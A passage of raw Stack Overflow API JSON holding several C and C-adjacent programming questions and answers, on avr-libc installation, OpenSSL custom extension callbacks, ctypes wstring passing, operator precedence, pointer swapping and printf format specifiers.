"link": "https://stackoverflow.com/users/6210842/toby-blunt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 721, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1594761058, "creation_date": 1544615226, "question_id": 53742369, "link": "https://stackoverflow.com/questions/53742369/using-brew-install-avr-libc-command-on-mac-produces-error-no-formulae-found-i", "title": "using &#39;brew install avr-libc&#39; command on Mac produces error &#39;no formulae found in taps&#39;", "body": "<p>I am running MacOS Mojave Version 10.14.1. I am attempting to install the avr embedded development environment. </p>\n\n<p>The command 'brew tap osx-cross/avr' works correctly however when the command 'brew install avr-libc' is used the following error is produced <a href=\"https://i.stack.imgur.com/EeGjn.png\" rel=\"nofollow noreferrer\">error</a></p>\n\n<p>This produces a problem as files in c cannot be compiled due to avr-gcc being unavailable.</p>\n\n<p>Any help and advice would be appreciated.</p>\n"}, {"tags": ["c", "ssl", "openssl", "network-programming", "tls1.2"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1544615096, "post_id": 53742269, "comment_id": 94337120, "body": "Probably related, if not a duplicate:  <a href=\"https://stackoverflow.com/questions/9317529/when-does-printf-fail-to-print\" title=\"when does printf fail to print\">stackoverflow.com/questions/9317529/&hellip;</a>"}, {"owner": {"reputation": 1, "user_id": 6475850, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-fXVae9aN_QA/AAAAAAAAAAI/AAAAAAAAAAA/6J44-EcKUt0/photo.jpg?sz=128", "display_name": "Videet Singhai", "link": "https://stackoverflow.com/users/6475850/videet-singhai"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1544679684, "post_id": 53742269, "comment_id": 94363673, "body": "no its very different, its related entirely to OpenSSL internals"}], "answers": [{"tags": [], "owner": {"reputation": 21, "user_id": 6251204, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69bfee4bd89205dc355ec4372554f6f6?s=128&d=identicon&r=PG&f=1", "display_name": "Bruno", "link": "https://stackoverflow.com/users/6251204/bruno"}, "is_accepted": false, "score": 1, "last_activity_date": 1557909818, "creation_date": 1557909818, "answer_id": 56145039, "question_id": 53742269, "link": "https://stackoverflow.com/questions/53742269/openssl-custom-extension-callback-functions/56145039#56145039", "title": "Openssl custom extension callback functions", "body": "<p>From <a href=\"https://www.openssl.org/docs/man1.1.1/man3/SSL_CTX_add_client_custom_ext.html\" rel=\"nofollow noreferrer\">Openssl doc about SSL_extension_supported</a>\nwe can see the following statements:</p>\n\n<blockquote>\n  <p>For the ServerHello and EncryptedExtension messages every registered add_cb is called once if and only if the requirements of the specified context are met and the corresponding extension was received in the ClientHello. That is, if no corresponding extension was received in the ClientHello then add_cb will not be called.</p>\n</blockquote>\n\n<p>I mean, the callbacks from both side(here is client and server) will execute <strong>only if</strong> server verify and accept the ClientHello which includes extensions. So you should add extension(here callback) to server like client to make sure callback to be executed. Here is my example:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>static int ext_add_cb(SSL *s, unsigned int ext_type,\n                      const unsigned char **out,\n                      size_t *outlen, int *al, void *add_arg)\n{\n    switch (ext_type) {\n        case 65280:\n            printf(\"ext_add_cb from client called!\\n\");\n            break;\n\n        default:\n            break;\n    }\n    return 1;\n}\n\nstatic void ext_free_cb(SSL *s, unsigned int ext_type,\n                        const unsigned char *out, void *add_arg)\n{\n    printf(\"ext_free_cb from client called\\n\");\n\n}\n\nstatic int ext_parse_cb(SSL *s, unsigned int ext_type,\n                        const unsigned char *in,\n                        size_t inlen, int *al, void *parse_arg)\n{\n    printf(\"ext_parse_cb from client called!\\n\");\n    return 1;\n}\n</code></pre>\n\n<p>server is similar to client. And then add register in <code>main</code>:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>    int result = SSL_CTX_add_client_custom_ext(ctx, 65280, ext_add_cb, ext_free_cb, NULL, ext_parse_cb, NULL);\n</code></pre>\n\n<p>Run server and then run client, I got this message:</p>\n\n<pre><code># server:\next_parse_cb from server called!\next_add_cb from server called!\next_free_cb from server called!\n\n\n# client:\next_add_cb from client called!\next_free_cb from client called\next_parse_cb from client called!\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6475850, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-fXVae9aN_QA/AAAAAAAAAAI/AAAAAAAAAAA/6J44-EcKUt0/photo.jpg?sz=128", "display_name": "Videet Singhai", "link": "https://stackoverflow.com/users/6475850/videet-singhai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 329, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1557909818, "creation_date": 1544614879, "question_id": 53742269, "link": "https://stackoverflow.com/questions/53742269/openssl-custom-extension-callback-functions", "title": "Openssl custom extension callback functions", "body": "<p>I am creating a custom extension using the OpenSSL custom extension API.</p>\n\n<p>The functions SSL_CTX_add_client_custom_ext and SSL_CTX_custom_ext return 1 i.e. success but the issue is there are certain callback functions which get called to operate on the data we need to add or parse. I added certain debug statements to find out whether they get called or not and I think they don't.</p>\n\n<pre><code>static int old_add_cb(SSL *s, unsigned int ext_type, const unsigned \nchar **out, size_t *outlen, int *al, void *add_arg) {\n\n printf(\"called!!\");\n     return 1;\n}\n\nstatic void old_free_cb(SSL *s, unsigned int ext_type, const unsigned \nchar *out, void *add_arg) {\n\n    printf(\"called!!\");\n    OPENSSL_free((unsigned char *)out);\n}\n\nstatic int old_parse_cb(SSL *s, unsigned int ext_type, const \n unsigned char *in, size_t inlen, int *al, void *parse_arg) {\n\n       printf(\"called!!\");     \n       return 1;\n}\n</code></pre>\n\n<p>The SSL_CTX related code is:</p>\n\n<pre><code>int main(int count, char *strings[]) {   \n\n   SSL_CTX *ctx;\n   int server;\n   SSL *ssl;\n   char buf[1024];\n   int bytes;\n   char *hostname, *portnum;\n\n   if ( count != 3 ) {\n    printf(\"usage: %s &lt;hostname&gt; &lt;portnum&gt;\\n\", strings[0]);\n    exit(0);\n           }\n\n   SSL_library_init();\n\n   hostname=strings[1];\n   portnum=strings[2];\n\n   ctx = InitCTX();\n   int result = SSL_CTX_add_custom_ext(ctx, 1000, \n                            SSL_EXT_CLIENT_HELLO, old_add_cb, \n                          old_free_cb, NULL, old_parse_cb, \n                                                 NULL);\n   printf(\"Extension Register %d\", result);\n\n   server = OpenConnection(hostname, atoi(portnum));\n   ssl = SSL_new(ctx);      /* create new SSL connection state */\n   SSL_set_fd(ssl, server);    /* attach the socket descriptor */\n\n   if ( SSL_connect(ssl) == FAIL )   /* perform the connection */\n       ERR_print_errors_fp(stderr);\n\n  else {   char *msg = \"Hello???\";\n\n    printf(\"Connected with %s encryption\\n\", SSL_get_cipher(ssl));\n    ShowCerts(ssl);        /* get any certs */\n    SSL_write(ssl, msg, strlen(msg));   /* encrypt &amp; send message */\n    bytes = SSL_read(ssl, buf, sizeof(buf)); /* get reply &amp; decrypt */\n    buf[bytes] = 0;\n    printf(\"Received: \\\"%s\\\"\\n\", buf);\n    SSL_free(ssl);        /* release connection state */\n   }\n  close(server);         /* close socket */\n  SSL_CTX_free(ctx);        /* release context */\n  return 0;\n   }\n</code></pre>\n\n<p>The 'SSL_CTX_add_custom_ext' function returns 1 but the print statements in callback functions are not being executed.</p>\n"}, {"tags": ["python", "c++", "c", "linux", "python-3.x"], "comments": [{"owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 1, "creation_date": 1544614382, "post_id": 53742089, "comment_id": 94336702, "body": "Have you tried cython or pybind11 for this task?"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1544614631, "post_id": 53742089, "comment_id": 94336866, "body": "The easiest and most productive way to create a Python wrapper for C++ code is with libraries like pybind11 or boost.python. Both support wide strings out of the box."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1544615731, "post_id": 53742089, "comment_id": 94337478, "body": "If you want a purely Python-based solution, you can try ctypes which also supports wchar_t based strings. It can only handle C-compatible types and interfaces though. However the utility of wchar_t is rather dubious. We handle almost evetything with UTF-8 these days, and that&#39;s the way we likes it."}, {"owner": {"reputation": 796, "user_id": 2684237, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/VE8d0.jpg?s=128&g=1", "display_name": "Kepedizer", "link": "https://stackoverflow.com/users/2684237/kepedizer"}, "reply_to_user": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 0, "creation_date": 1544615893, "post_id": 53742089, "comment_id": 94337577, "body": "@MatthieuBrucher - thanks, I have looked into both, but as I&#39;m not proficient in C or C++ I really hoped there would be a way to achieve this in python3. guess not."}, {"owner": {"reputation": 796, "user_id": 2684237, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/VE8d0.jpg?s=128&g=1", "display_name": "Kepedizer", "link": "https://stackoverflow.com/users/2684237/kepedizer"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1544616044, "post_id": 53742089, "comment_id": 94337668, "body": "@n.m.          If I&#39;m not mistaken ctypes cannot be used to call a function that expects *wstring or other c++ types. out of pybind11 and boost.python, which do you find easier?"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1544627220, "post_id": 53742089, "comment_id": 94344151, "body": "Right, it only works with C types, which is why it is called ctypes. You would need to convert between C-style strings and C++-style strings at the .so side. I find pybind11 much easier because it is a header-only library."}, {"owner": {"reputation": 796, "user_id": 2684237, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/VE8d0.jpg?s=128&g=1", "display_name": "Kepedizer", "link": "https://stackoverflow.com/users/2684237/kepedizer"}, "edited": false, "score": 0, "creation_date": 1545259936, "post_id": 53742089, "comment_id": 94568506, "body": "I opted on wrapping the 3rd part lib with my own very simple CPP code that converts whatever is necessary within methods defined as &quot;extern c&quot;. so everything is accessible using ctypes types. Not sure if that counts as an answer though... does it?"}], "owner": {"reputation": 796, "user_id": 2684237, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/VE8d0.jpg?s=128&g=1", "display_name": "Kepedizer", "link": "https://stackoverflow.com/users/2684237/kepedizer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 93, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1544671602, "creation_date": 1544614215, "last_edit_date": 1544671602, "question_id": 53742089, "link": "https://stackoverflow.com/questions/53742089/passing-a-wstring-pointer-to-a-3rd-party-so-written-in-c", "title": "Passing a wstring pointer to a 3rd party SO written in c++", "body": "<p>I am writing a simple python 3.5 wrapper for a .SO that was coded in c++. Facing a function that expects a <strong>comtypes.BSTR*</strong> pointer I've hit a block, since I'm working on linux (ubuntu 16.04) (not changeable) and cannot use python's <em>comtypes</em> lib which is windows-only. I have an example containing some C++ code that calls the .SO , and there they are using <strong>wstring</strong> as a replacement for BSTR:</p>\n\n<pre><code>#define BSTR        wstring\n</code></pre>\n\n<p>my problem is that <em>ctypes</em> does not support wstring as a possible type, as seen in <a href=\"https://stackoverflow.com/a/53136004/2684237\">this</a> answer. \nSo how do I get python to pass a pointer to a <strong>wstring</strong>? Is there no way short of wrapping the SO in another SO, written in C and more suited to usage with python? Note I cannot change anything in the .SO I'm using so the solution here ideally is python-based...</p>\n"}, {"tags": ["c", "pointers"], "answers": [{"tags": [], "owner": {"reputation": 75299, "user_id": 139746, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/BhJLC.png?s=128&g=1", "display_name": "Pascal Cuoq", "link": "https://stackoverflow.com/users/139746/pascal-cuoq"}, "is_accepted": true, "score": 6, "last_activity_date": 1544613354, "creation_date": 1544613354, "answer_id": 53741854, "question_id": 53741711, "link": "https://stackoverflow.com/questions/53741711/3-p-q7-6-how-it-works/53741854#53741854", "title": "(3* - *p/(*q)+7) = 6 how it works?", "body": "<p>Taking into account the precedence rules that are implicitly encoded in <a href=\"https://port70.net/~nsz/c/c11/n1570.html#A.2.1\" rel=\"noreferrer\">the grammar of the C language</a>, <code>3* -*p/(*q)+7</code> is <code>((3 * (-*p)) / (*q)) + 7</code>.</p>\n\n<p>The result of <code>-9 / 5</code> is <code>-1</code> because <code>/</code> represents integer division here.</p>\n\n<p>The result of <code>-1 + 7</code> is 6.</p>\n"}, {"tags": [], "owner": {"reputation": 24693, "user_id": 10190237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f95f50f67af8a9658c5d76df263b323?s=128&d=identicon&r=PG&f=1", "display_name": "P.W", "link": "https://stackoverflow.com/users/10190237/p-w"}, "is_accepted": false, "score": 3, "last_activity_date": 1544613674, "last_edit_date": 1544613674, "creation_date": 1544613387, "answer_id": 53741862, "question_id": 53741711, "link": "https://stackoverflow.com/questions/53741711/3-p-q7-6-how-it-works/53741862#53741862", "title": "(3* - *p/(*q)+7) = 6 how it works?", "body": "<p>Because of <a href=\"https://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\">operator precedence and associativity</a><br>\n<code>3* -*p/(*q)+7</code> is the same as<br>\n<code>(3 * - 3)/5 + 7</code> which is the same as<br>\n<code>-9/5 + 7</code> which because of integer division is the same as<br>\n<code>-1 + 7</code> which is the same as   </p>\n\n<pre><code>6\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 10666972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a32af84c4e24b777d471262d250d331e?s=128&d=identicon&r=PG&f=1", "display_name": "lucas pelepek", "link": "https://stackoverflow.com/users/10666972/lucas-pelepek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 53741854, "answer_count": 2, "score": -3, "last_activity_date": 1544613674, "creation_date": 1544612898, "question_id": 53741711, "link": "https://stackoverflow.com/questions/53741711/3-p-q7-6-how-it-works", "title": "(3* - *p/(*q)+7) = 6 how it works?", "body": "<pre><code>int i=3,j=5;\n    int *p, *q;\n    p = &amp;i;\n    q = &amp;j;\n\n    printf(\"%d\\n\", 3* -*p/(*q)+7);\n</code></pre>\n\n<p>The compiler says the result is 6, but i can't understand how, for me it was suposed to be (-9/12) = -0,74 or 0 beacause is a int, can anyone help?</p>\n"}, {"tags": ["c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 2, "creation_date": 1544612541, "post_id": 53741525, "comment_id": 94335676, "body": "<code>new-&gt;words[i] = (char*) calloc(wordlen, sizeof(char)); new-&gt;words[i] = NULL;</code> why do you set it to <code>NULL</code> right after allocating?"}, {"owner": {"reputation": 316, "user_id": 6333825, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tvlxz.jpg?s=128&g=1", "display_name": "Concrete_Buddha", "link": "https://stackoverflow.com/users/6333825/concrete-buddha"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544613989, "post_id": 53741525, "comment_id": 94336457, "body": "@Osiris You are right, it is not needed.  I was trying to create a minimum viable example, and this code sneeked in from an example where I was using the NULL elsewhere."}], "answers": [{"comments": [{"owner": {"reputation": 316, "user_id": 6333825, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tvlxz.jpg?s=128&g=1", "display_name": "Concrete_Buddha", "link": "https://stackoverflow.com/users/6333825/concrete-buddha"}, "edited": false, "score": 0, "creation_date": 1544614576, "post_id": 53741603, "comment_id": 94336826, "body": "Appreciate your comments.  I have tried what I think is this approach though, I&#39;ve edited my question to include this.  I am sure you are right - it is just my implementation that is lacking :)"}, {"owner": {"reputation": 4398, "user_id": 3697264, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/5adc5afbd7a1145fdd762d872b4b43bb?s=128&d=identicon&r=PG", "display_name": "SPlatten", "link": "https://stackoverflow.com/users/3697264/splatten"}, "reply_to_user": {"reputation": 316, "user_id": 6333825, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tvlxz.jpg?s=128&g=1", "display_name": "Concrete_Buddha", "link": "https://stackoverflow.com/users/6333825/concrete-buddha"}, "edited": false, "score": 0, "creation_date": 1544614611, "post_id": 53741603, "comment_id": 94336849, "body": "See my edit to the answer, there is more wrong than just passing back the pointer."}, {"owner": {"reputation": 316, "user_id": 6333825, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tvlxz.jpg?s=128&g=1", "display_name": "Concrete_Buddha", "link": "https://stackoverflow.com/users/6333825/concrete-buddha"}, "edited": false, "score": 0, "creation_date": 1544615471, "post_id": 53741603, "comment_id": 94337312, "body": "Thank you for your answer, and I do appreciate the time you have put towards this - unfortunately a constraint I have is that the function in main I have to call is void book_insert(dic* s, char* v) i.e. single pointer only.  I&#39;ll edit the question to add this."}, {"owner": {"reputation": 4398, "user_id": 3697264, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/5adc5afbd7a1145fdd762d872b4b43bb?s=128&d=identicon&r=PG", "display_name": "SPlatten", "link": "https://stackoverflow.com/users/3697264/splatten"}, "reply_to_user": {"reputation": 316, "user_id": 6333825, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tvlxz.jpg?s=128&g=1", "display_name": "Concrete_Buddha", "link": "https://stackoverflow.com/users/6333825/concrete-buddha"}, "edited": false, "score": 0, "creation_date": 1544616059, "post_id": 53741603, "comment_id": 94337678, "body": "You can do it, but I think your original question and implementation were a bit misleading, all you actually need is one instance of book with multiple words, correct?"}], "tags": [], "owner": {"reputation": 4398, "user_id": 3697264, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/5adc5afbd7a1145fdd762d872b4b43bb?s=128&d=identicon&r=PG", "display_name": "SPlatten", "link": "https://stackoverflow.com/users/3697264/splatten"}, "is_accepted": false, "score": 2, "last_activity_date": 1544615061, "last_edit_date": 1544615061, "creation_date": 1544612582, "answer_id": 53741603, "question_id": 53741525, "link": "https://stackoverflow.com/questions/53741525/swapping-c-pointer-to-function-within-function/53741603#53741603", "title": "Swapping C pointer to function within function", "body": "<p>In order to modify a pointer inside a function you have to pass the address of the pointer to the function, eg:</p>\n\n<pre><code>    void changePtr(char* test) {\n        test = \"Hello\";\n    }\n</code></pre>\n\n<p>The above will not work because test cannot be returned to the caller, however:</p>\n\n<pre><code>    void changePtr(char** test) {\n        if ( test != NULL ) {\n            *test = \"Hello\";\n        }\n    }\n</code></pre>\n\n<p>The above will work because the address of the pointer is passed and it can be de-referenced to change the contents.</p>\n\n<p>Example of calling:</p>\n\n<pre><code>    char* ptr;\n    changePtr(&amp;ptr);\n</code></pre>\n\n<p>Here is a rewrite of your code implementing the above technique:</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;stdlib.h&gt;\n\n    typedef struct _book {\n       int size;\n       int count;\n       char** words;  //Must allocate space for each pointer before copying to.\n    } book;\n\n    //No need for below, see above:\n    //typedef struct book book;\n\n    /* Create empty book, specifying lenght of strings and how many of them */\n    book* book_init(int wordlen, int maxwords);\n    /* Add one element into the book */\n    void book_insert(book** s, char* v);\n    /* Creates and returns new, bigger book */\n    book* resize(book* s, book* new);\n    /* Prints book */\n    void prints(book* a);\n\n    int main(void) {\n       book* test = book_init(60, 10);        \n       book_insert(&amp;test, \"dog\");\n       book_insert(&amp;test, \"cat\");\n       book_insert(&amp;test, \"mouse\");\n       book_insert(&amp;test, \"elephant\");\n       book_insert(&amp;test, \"snake\");      \n       /*The next insert will cause the resize function to trigger*/\n       book_insert(&amp;test, \"fish\");        \n       /*The resize funtion should cause 'test' to be replaced by a bigger book*/\n       /*But doesn't as this next print shows*/     \n       printf(\"But printing from main function means I'm back to %d\\n\", test-&gt;size);\n       prints(test);\n    }\n\n\n    void book_insert(book** s, char* v) {\n       if ( s == NULL || v == NULL ) {\n         return;\n       }\n       (*s)-&gt;words = realloc((*s)-&gt;words, sizeof(char*) * (++(*s)-&gt;count));\n       (*s)-&gt;words[(*s)-&gt;count - 1] = v;\n       /*If the book is half full resize is triggered, and should pass back new, bigger book*/\n       if((((*s)-&gt;count * 100) / s-&gt;size) &gt; 50) {\n          book *new_book;\n          new_book = book_init(60, 20);\n          *s = resize(*s, new_book);\n       }\n    }\n\n    book* resize(book* s, book* new) {\n       int i;\n       for (i = 0; i &lt; s-&gt;size; i++) {\n          if (s-&gt;words[i] != NULL ) {\n             new-&gt;words[i] = s-&gt;words[i];\n          }\n       }        \n       printf(\"Printing from resize function gives me new length of %d\\n\", new-&gt;size);\n       prints(new);\n       return new;\n     }\n\n     book* book_init(int wordlen, int maxwords) {\n        int i;\n        book* new = calloc(1, sizeof(book));\n        new-&gt;size = maxwords;\n        return new;\n     }\n\n     void prints(book* a) {\n        int i;\n        for (i = 0; i &lt; a-&gt;size; i++) {\n           printf(\"Index: %d, word: %s\\n\", i, a-&gt;words[i]);\n        }\n     }\n</code></pre>\n"}], "owner": {"reputation": 316, "user_id": 6333825, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tvlxz.jpg?s=128&g=1", "display_name": "Concrete_Buddha", "link": "https://stackoverflow.com/users/6333825/concrete-buddha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "closed_date": 1544615229, "answer_count": 1, "score": 0, "last_activity_date": 1544617143, "creation_date": 1544612343, "last_edit_date": 1544617143, "question_id": 53741525, "link": "https://stackoverflow.com/questions/53741525/swapping-c-pointer-to-function-within-function", "closed_reason": "Duplicate", "title": "Swapping C pointer to function within function", "body": "<p>I have created a structure which includes an array of strings and have populated that with words.  When I try and fill the array more than half full I want to create a larger structure, copy the current data to that larger structure and then have that larger structure 'replace' the old one that is called from main.  Although I have successfully created and copied the data to the new structure; which I can prove by printing the data out from within the function; I am not able to replace the old structure in main.  The next <code>book_insert</code> I try inserts to the old, smaller structure not the new, larger one.</p>\n\n<p>I am operating within a constraint whereby I cannot do the resizing / copying / replacing within main; it has to be called from the <code>book_insert</code> function called from main.  Additionally I cannot edit <code>void book_insert(dic* s, char* v)</code> (i.e. add double pointers), it has to remain in this format.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct book {\n   int size;\n   int count;\n   char** words;\n};\n\ntypedef struct book book;\n\n/* Create empty book, specifying lenght of strings and how many of them */\nbook* book_init(int wordlen, int maxwords);\n/* Add one element into the book */\nvoid book_insert(book* s, char* v);\n/* Creates and returns new, bigger book */\nbook* resize(book* s, book* new);\n/* Prints book */\nvoid prints(book* a);\n\nint main(void) \n{\n   book* test;\n   test = book_init(60, 10);\n\n   book_insert(test, \"dog\");\n   book_insert(test, \"cat\");\n   book_insert(test, \"mouse\");\n   book_insert(test, \"elephant\");\n   book_insert(test, \"snake\");\n\n   /*The next insert will cause the resize function to trigger*/\n   book_insert(test, \"fish\");\n\n   /*The resize funtion should cause 'test' to be replaced by a bigger book*/\n   /*But doesn't as this next print shows*/     \n   printf(\"But printing from main function means I'm back to %d\\n\", test-&gt;size);\n   prints(test);\n\n}\n\n\nvoid book_insert(book* s, char* v)\n{\n   int i = 0;\n\n   while (s-&gt;words[i] != NULL ) {\n      i++;\n   }\n\n   s-&gt;words[i] = v;\n   s-&gt;count++;\n\n   /*If the book is half full resize is triggered, and should pass back new, bigger book*/\n   if((s-&gt;count * 100 / s-&gt;size) &gt; 50) {\n      book *new_book;\n      new_book = book_init(60, 20);\n      s = resize(s, new_book);\n      printf(\"Printing from resize function gives me new length of %d\\n\", s-&gt;size);\n      prints(s);\n   }\n}\n\nbook* resize(book* s, book* new)\n{\n   int i;\n   for (i = 0; i &lt; s-&gt;size; i++) {\n      if (s-&gt;words[i] != NULL ) {\n         new-&gt;words[i] = s-&gt;words[i];\n      }\n   }\n\n\n\n   return new;\n }\n\n book* book_init(int wordlen, int maxwords)\n {\n    int i;\n    book* new = malloc(sizeof(book));\n    new-&gt;size = maxwords;\n    new-&gt;count = 0;\n    new-&gt;words = (char**) calloc((size_t)new-&gt;size, sizeof(char*));\n\n    for (i=0; i&lt;new-&gt;size; i++) {\n       new-&gt;words[i] = (char*) calloc(wordlen, sizeof(char));\n       new-&gt;words[i] = NULL;\n    }\n\n    return new;\n }\n\n void prints(book* a)\n {\n    int i;\n    for (i = 0; i &lt; a-&gt;size; i++) {\n       printf(\"Index: %d, word: %s\\n\", i, a-&gt;words[i]);\n    }\n }\n</code></pre>\n\n<p>I have also attempted this with a pointer swap in a separate function, but this does not seem to work either.  In this version I have made <code>book_resize</code> void and instead from <code>dic_insert</code> called the below function, after the resize, with <code>dictionary_swap(&amp;new_book, &amp;s)</code>: </p>\n\n<pre><code>void dictionary_swap(book **new, book **old) \n{\n   book *temp = *old;\n   *old = *new;\n   *new = temp;\n}\n</code></pre>\n\n<p>This again lets me print out the new larger, structure within the <code>book_insert</code> function, but has no affect on what happens in main.</p>\n\n<p><strong><em>EDIT ANSWER</em></strong>\nThis question has been marked as a duplicate, which means I can't answer it myself, however I have since found the answer; I changed the above duplicate swap so that I called <code>dictionary_swap(new_book, s);</code> (no ampersands) on the following code:</p>\n\n<pre><code>void dictionary_swap(book *new, book *old) \n{\n   book temp;\n\n   temp = *old;\n   *old = *new;\n   *new = temp;\n}\n</code></pre>\n"}, {"tags": ["c", "string", "printf"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1544611587, "post_id": 53741237, "comment_id": 94335127, "body": "Check the types!!"}], "answers": [{"tags": [], "owner": {"reputation": 16436, "user_id": 10411602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b534549770aedbc4d7eb03a39d740f6?s=128&d=identicon&r=PG&f=1", "display_name": "Blaze", "link": "https://stackoverflow.com/users/10411602/blaze"}, "is_accepted": false, "score": 6, "last_activity_date": 1544612023, "last_edit_date": 1544612023, "creation_date": 1544611636, "answer_id": 53741303, "question_id": 53741237, "link": "https://stackoverflow.com/questions/53741237/cstring-and-array-about-s-c/53741303#53741303", "title": "[C]String and Array about %s , %c", "body": "<p><code>%c</code> prints a <code>char</code>. <code>%s</code> prints a string, so it expects a pointer to a <code>char</code>.</p>\n\n<pre><code>char Array[STRSIZE];\n</code></pre>\n\n<p>Here, <code>Array</code> is an array of <code>char</code>, so the expression <code>Array</code> passed to a function decays to a pointer to <code>char</code>. So it can be used for <code>%s</code> (assuming the string is valid).</p>\n\n<p><code>Array[i]</code>, however, is not a string. It is a <code>char</code>, and as such it can be passed for<code>%c</code>, but not for<code>%s</code>. So the possibilities are:</p>\n\n<ul>\n<li>print a string with <code>printf(\"%s\",Array);</code></li>\n<li>print a single char of that string with <code>printf(\"%c\",Array[i]);</code>. By iterating through the string you can print the whole string like this, too</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "is_accepted": false, "score": 3, "last_activity_date": 1544611739, "creation_date": 1544611739, "answer_id": 53741336, "question_id": 53741237, "link": 